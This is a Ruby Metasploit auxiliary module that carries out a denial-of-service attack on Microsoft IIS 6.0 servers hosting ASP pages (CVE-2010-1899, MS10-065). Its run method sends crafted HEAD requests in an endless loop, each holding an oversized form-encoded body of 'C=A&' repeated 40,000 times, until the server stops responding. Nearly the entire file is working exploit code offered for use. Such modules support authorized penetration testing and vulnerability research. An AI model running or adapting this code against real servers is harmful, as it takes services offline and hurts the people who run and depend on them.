##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service',
      'Description'    => %q{
          The vulnerability allows remote unauthenticated attackers to force the IIS server
        to become unresponsive until the IIS service is restarted manually by the administrator.
        Required is that Active Server Pages are hosted by the IIS and that an ASP script reads
        out a Post Form value.
      },
      'Author'         =>
        [
          'Alligator Security Team',
          'Heyder Andrade <heyder[at]alligatorteam.org>',
          'Leandro Oliveira <leadro[at]alligatorteam.org>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-1899' ],
          [ 'OSVDB', '67978'],
          [ 'MSB', 'MS10-065'],
          [ 'EDB', '15167' ]
        ],
      'DisclosureDate' => 'Sep 14 2010'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('VHOST', [ false, 'The virtual host name to use in requests']),
        OptString.new('URI', [ true, 'URI to request', '/page.asp' ])
      ], self.class )
  end


  def run
    uri = datastore['URI']
    print_status("Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{uri}")

    begin
      while(1)
        begin
          connect
          payload = "C=A&" * 40000
          length = payload.size
          sploit = "HEAD #{uri} HTTP/1.1\r\n"
          sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
          sploit << "Connection:Close\r\n"
          sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
          sploit << "Content-Length:#{length} \r\n\r\n"
          sploit << payload
          sock.put(sploit)
          #print_status("DoS packet sent.")
          disconnect
        rescue Errno::ECONNRESET
          next
        end
      end
    rescue Errno::EPIPE
      print_good("IIS should now be unavailable")
    end
  end
end
